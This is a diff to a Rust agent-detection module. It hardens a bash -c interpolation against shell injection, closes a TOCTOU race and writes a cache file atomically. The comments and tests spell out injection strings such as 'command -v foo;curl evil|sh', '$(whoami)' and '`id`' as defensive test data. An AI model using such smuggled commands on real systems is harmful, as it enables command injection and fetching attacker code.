@@ -36,28 +36,40 @@ use crate::dispatcher;
 /// probe. Mirrors `DETECT_AGENT_LEGACY_IDS` (detect/agents.sh).
 const LEGACY_IDS: &[&str] = &["claude-code", "gsd", "playwright-cli"];
 
-/// A resolved per-agent detect record — the 6 fields the Bash probe wrote. Only
-/// `id`/`status`/`path`/`version` are read back by [`crate::cache`]; `binary` +
-/// `owner` are retained for cache-shape parity with the Bash `detect::agents_probe`
-/// output and any external reader.
+/// A resolved per-agent detect record. `id`/`status`/`path`/`version` are the
+/// fields [`crate::cache`] reads back; `binary` is retained (it is already in hand,
+/// zero extra I/O) so a human or debug tooling inspecting the cache can see which
+/// binary each row was probed for. The Bash probe also wrote an `owner` field —
+/// dropped here because no reader consumes it and resolving it cost a `stat` +
+/// uid/gid→name lookup for nothing.
 #[derive(Debug, Clone, PartialEq, Eq)]
 struct AgentRecord {
     id: String,
     binary: String,
     path: String,
     version: String,
-    owner: String,
     status: String,
 }
 
 /// Extract the `command -v <bin>` binary token from a `post_install_verify` string.
 /// Mirrors the Bash `capture("command -v (?<b>[^ ]+)")` — the first token after
-/// the FIRST `command -v `. `None` when the marker is absent or the token empty.
+/// the FIRST `command -v `. `None` when the marker is absent, the token empty, or
+/// the token carries any character outside `[A-Za-z0-9._/-]`.
+///
+/// The charset guard is load-bearing: [`probe_one`]/[`probe_version`] interpolate
+/// this token RAW into a `bash -c` script. `post_install_verify` is a free-form
+/// string with no schema `pattern`, so a catalog carrying
+/// `command -v foo;curl evil|sh` would otherwise inject `foo;curl` as the install
+/// user. The catalog is a root-owned `/opt` artifact today (so this is
+/// belt-and-suspenders), but the guard makes the interpolation safe LOCALLY rather
+/// than only by catalog provenance. A real `command -v` argument never needs a
+/// shell metacharacter, so rejecting the row (→ agent simply not probed) is safe.
 fn verify_binary(verify: &str) -> Option<String> {
     let idx = verify.find("command -v ")?;
     let rest = &verify[idx + "command -v ".len()..];
     let tok = rest.split_whitespace().next()?;
-    (!tok.is_empty()).then(|| tok.to_string())
+    let safe = |c: char| c.is_ascii_alphanumeric() || matches!(c, '.' | '_' | '/' | '-');
+    (!tok.is_empty() && tok.chars().all(safe)).then(|| tok.to_string())
 }
 
 /// Derive `(id, binary)` rows for every PATH-resolvable catalog tool: non-`mcp`,
@@ -167,6 +179,11 @@ fn classify(id: &str, version: &str, legacy_help_ok: bool) -> &'static str {
 /// the install home (so `~/.local/bin` + `~/.npm-global/bin` resolve even before
 /// the profile sources them) plus every `AGENTLINUX_*` seam. Mirrors the adoption
 /// child env — a login shell then layers `/etc/profile.d/agentlinux.sh` on top.
+///
+/// Invariant: every `AGENTLINUX_*` var is a path/config seam (`_CATALOG_DIR`,
+/// `_DETECT_CACHE`, `_STATE_DIR`, …), NOT a secret — so forwarding them into an
+/// unprivileged child shell leaks nothing. A future `AGENTLINUX_*TOKEN`-style var
+/// would break this assumption and must NOT be forwarded here.
 fn probe_env(home: &str) -> Vec<(String, String)> {
     let mut env: Vec<(String, String)> = vec![
         ("PATH".to_string(), crate::recipe_env::canonical_path(home)),
@@ -193,13 +210,20 @@ fn login_run(user: &str, home: &str, script: &str) -> (i32, String) {
 }
 
 /// Per-probe timeout — a version/`command -v` shell-out is sub-second; finite so a
-/// hung binary cannot wedge the whole scan.
-const PROBE_TIMEOUT_MS: u64 = 8_000;
+/// hung binary cannot wedge the whole scan. Kept modest: the scan is serial over
+/// the whole catalog and each present agent fires up to ~5 shell-outs, so a
+/// generous ceiling would let a few pathological binaries add minutes to a
+/// greenfield provision. 5s is ample for any real `--version`/`--help` while
+/// trimming that tail (absent agents fail `command -v` fast and skip the rest).
+const PROBE_TIMEOUT_MS: u64 = 5_000;
 
 /// Probe an agent's version via its id-specific flag(s). The legacy three parse
 /// `--version` (gsd: `--help`, no `--version` flag); the rest try
-/// `--version`/`version`/`--help` in turn. First semver wins. `binary` is a
-/// catalog-sourced token (trusted); it is the ONLY interpolated value.
+/// `--version`/`version`/`--help` in turn. First semver wins. `binary` is the ONLY
+/// interpolated value; it is safe because [`verify_binary`] already rejected any
+/// token outside `[A-Za-z0-9._/-]` (so no shell metacharacter can reach this
+/// `bash -c`), and the captured stdout is bounded by [`extract_semver`] to a pure
+/// semver substring — it never re-enters a shell.
 fn probe_version(user: &str, home: &str, id: &str, binary: &str) -> String {
     let flags: &[&str] = match id {
         "claude-code" | "playwright-cli" => &["--version"],
@@ -215,26 +239,6 @@ fn probe_version(user: &str, home: &str, id: &str, binary: &str) -> String {
     String::new()
 }
 
-/// `user:group` owner of `path` (following symlinks, as Bash `stat -c '%U:%G'`
-/// does), or `"unknown"` on any error. Not read by the pure gate — retained for
-/// cache-shape parity.
-fn owner_of(path: &str) -> String {
-    use std::os::unix::fs::MetadataExt;
-    let md = match std::fs::metadata(path) {
-        Ok(m) => m,
-        Err(_) => return "unknown".to_string(),
-    };
-    let user = nix::unistd::User::from_uid(nix::unistd::Uid::from_raw(md.uid()))
-        .ok()
-        .flatten()
-        .map_or_else(|| md.uid().to_string(), |u| u.name);
-    let group = nix::unistd::Group::from_gid(nix::unistd::Gid::from_raw(md.gid()))
-        .ok()
-        .flatten()
-        .map_or_else(|| md.gid().to_string(), |g| g.name);
-    format!("{user}:{group}")
-}
-
 /// Probe a single `(id, binary)` row into an [`AgentRecord`]. Resolves the binary
 /// on the install user's login PATH; on a miss, GSD falls back to its deployed
 /// `~/.claude/gsd-core/VERSION` (owner-gated). Absent everywhere → `status=absent`.
@@ -248,7 +252,6 @@ fn probe_one(user: &str, home: &str, id: &str, binary: &str) -> AgentRecord {
 
     if let Some(path) = resolved {
         let version = probe_version(user, home, id, binary);
-        let owner = owner_of(&path);
         // Legacy ids additionally gate health on `--help` exit 0.
         let legacy_help_ok = if LEGACY_IDS.contains(&id) {
             login_run(user, home, &format!("{binary} --help >/dev/null 2>&1")).0 == 0
@@ -261,7 +264,6 @@ fn probe_one(user: &str, home: &str, id: &str, binary: &str) -> AgentRecord {
             binary: binary.to_string(),
             path,
             version,
-            owner,
             status: status.to_string(),
         };
     }
@@ -282,7 +284,6 @@ fn probe_one(user: &str, home: &str, id: &str, binary: &str) -> AgentRecord {
         binary: binary.to_string(),
         path: String::new(),
         version: String::new(),
-        owner: String::new(),
         status: "absent".to_string(),
     }
 }
@@ -290,34 +291,52 @@ fn probe_one(user: &str, home: &str, id: &str, binary: &str) -> AgentRecord {
 /// The GSD deployed-`VERSION`-file presence signal, owner-gated. `Some` only when
 /// the file exists AND is owned by `user`; a non-empty trimmed body → healthy,
 /// empty → broken. `None` (→ caller reports `absent`) when missing or foreign-owned.
+///
+/// Opens the file ONCE and derives both the owner-check and the contents from that
+/// single handle (`File::open` + `fstat` via `File::metadata`), so the path is not
+/// re-resolved between the check and the read — closing the TOCTOU window where the
+/// install user (the only principal that could win the gate) might swap the
+/// symlink target after the owner check. `open` still follows the symlink, but the
+/// fstat'd target must be uid-owned by the install user, so the worst case only
+/// ever reads a file that user already owns.
 fn gsd_version_file_record(user: &str, ver_file: &str) -> Option<AgentRecord> {
+    use std::io::Read;
     use std::os::unix::fs::MetadataExt;
-    let md = std::fs::metadata(ver_file).ok()?;
+    let mut f = std::fs::File::open(ver_file).ok()?;
+    let md = f.metadata().ok()?;
     let owned =
         matches!(nix::unistd::User::from_name(user), Ok(Some(u)) if u.uid.as_raw() == md.uid());
     if !owned {
         return None;
     }
-    let ver: String = std::fs::read_to_string(ver_file)
-        .ok()?
-        .split_whitespace()
-        .collect();
+    let mut raw = String::new();
+    f.read_to_string(&mut raw).ok()?;
+    let ver: String = raw.split_whitespace().collect();
     let status = if ver.is_empty() { "broken" } else { "healthy" };
     Some(AgentRecord {
         id: "gsd".to_string(),
         binary: "gsd-core".to_string(),
         path: ver_file.to_string(),
         version: ver,
-        owner: owner_of(ver_file),
         status: status.to_string(),
     })
 }
 
 /// Serialize the records into the `{agents: [...]}` cache doc + write it to the
 /// resolved detect-cache path (`$AGENTLINUX_DETECT_CACHE` else
-/// `/run/agentlinux-detect.json`). Best-effort: returns the write error for the
+/// `/run/agentlinux-detect.json`). Best-effort: returns any I/O error for the
 /// caller to log; never panics.
+///
+/// Written atomically — a sibling `*.tmp` in the SAME directory, then `rename` into
+/// place. `rename` is atomic within a filesystem, so a concurrent `agentlinux
+/// install` reader sees either the old cache or the fully-written new one, never a
+/// truncated prefix, and a provision killed mid-write cannot leave a torn JSON on
+/// `/run`. An explicit `0o644` mode (root writes it; the unprivileged install user
+/// must read it during `install`/`adopt`) replaces reliance on the ambient umask.
 fn write_cache(records: &[AgentRecord]) -> std::io::Result<()> {
+    use std::io::Write;
+    use std::os::unix::fs::OpenOptionsExt;
+
     let agents: Vec<serde_json::Value> = records
         .iter()
         .map(|r| {
@@ -326,14 +345,30 @@ fn write_cache(records: &[AgentRecord]) -> std::io::Result<()> {
                 "binary": r.binary,
                 "path": r.path,
                 "version": r.version,
-                "owner": r.owner,
                 "status": r.status,
             })
         })
         .collect();
     let doc = serde_json::json!({ "agents": agents });
-    let body = serde_json::to_string_pretty(&doc).unwrap_or_else(|_| "{\"agents\":[]}".to_string());
-    std::fs::write(crate::cache::detect_cache_path(), body)
+    // Plain-string values → serialization cannot fail in practice; propagate rather
+    // than mask it as a silent empty-agents cache (which would read as a false
+    // "nothing installed" and mis-decide REUSE/REMEDIATE with no log breadcrumb).
+    let body = serde_json::to_string_pretty(&doc)
+        .map_err(|e| std::io::Error::new(std::io::ErrorKind::InvalidData, e))?;
+
+    let path = crate::cache::detect_cache_path();
+    let tmp = path.with_extension("json.tmp");
+    {
+        let mut f = std::fs::OpenOptions::new()
+            .write(true)
+            .create(true)
+            .truncate(true)
+            .mode(0o644)
+            .open(&tmp)?;
+        f.write_all(body.as_bytes())?;
+        f.sync_all()?;
+    }
+    std::fs::rename(&tmp, &path)
 }
 
 /// Scan the host for every catalog agent + write the detect cache's `.agents`
@@ -384,6 +419,25 @@ mod detect_tests {
         assert_eq!(verify_binary("test -f ~/.claude"), None);
         // Marker present but nothing after → None.
         assert_eq!(verify_binary("command -v "), None);
+        // The FIRST `command -v` wins (a `rfind` regression would return "bar").
+        assert_eq!(
+            verify_binary("command -v foo || command -v bar").as_deref(),
+            Some("foo")
+        );
+    }
+
+    #[test]
+    fn verify_binary_rejects_shell_metacharacters() {
+        // A token carrying a shell metacharacter is refused (→ row not probed),
+        // so the raw interpolation into `bash -c` can never inject.
+        assert_eq!(verify_binary("command -v foo;curl evil|sh"), None);
+        assert_eq!(verify_binary("command -v $(whoami)"), None);
+        assert_eq!(verify_binary("command -v `id`"), None);
+        // A legitimate path-shaped binary token is still accepted.
+        assert_eq!(
+            verify_binary("command -v /usr/bin/foo-bar_1.2").as_deref(),
+            Some("/usr/bin/foo-bar_1.2")
+        );
     }
 
     fn entry(
@@ -479,6 +533,39 @@ mod detect_tests {
             extract_semver("1.2.3-a$(whoami)").as_deref(),
             Some("1.2.3-a")
         );
+    }
+
+    #[test]
+    fn extract_semver_prerelease_boundary() {
+        // A bare trailing hyphen with no tail is dropped (empty prerelease is not
+        // a match) — the `j > tail_start` guard; a regression that made `i = j`
+        // unconditional would return "1.2.3-" and change a cached gate value.
+        assert_eq!(extract_semver("1.2.3-").as_deref(), Some("1.2.3"));
+        assert_eq!(
+            extract_semver("1.2.3-rc1 (build)").as_deref(),
+            Some("1.2.3-rc1")
+        );
+        // `+build` metadata is outside the tail charset → stops at '+'.
+        assert_eq!(
+            extract_semver("1.2.3-rc1+build5").as_deref(),
+            Some("1.2.3-rc1")
+        );
+    }
+
+    #[test]
+    fn extract_semver_leftmost_and_no_fourth_component() {
+        // Two full semvers → the leftmost wins (grep -Eo leftmost match).
+        assert_eq!(extract_semver("a 3.4.5 b 6.7.8").as_deref(), Some("3.4.5"));
+        // A fourth dotted component is not absorbed into the version.
+        assert_eq!(extract_semver("1.2.3.4").as_deref(), Some("1.2.3"));
+    }
+
+    #[test]
+    fn extract_semver_uppercase_prerelease_truncates_to_release() {
+        // Prerelease charset is lowercase-only (mirrors Bash [a-z0-9.-]); an
+        // uppercase tail is dropped rather than captured. Intentional narrowing —
+        // pinned so a future uppercase-versioned tool's truncation isn't a surprise.
+        assert_eq!(extract_semver("1.2.3-RC1").as_deref(), Some("1.2.3"));
     }
 
     #[test]
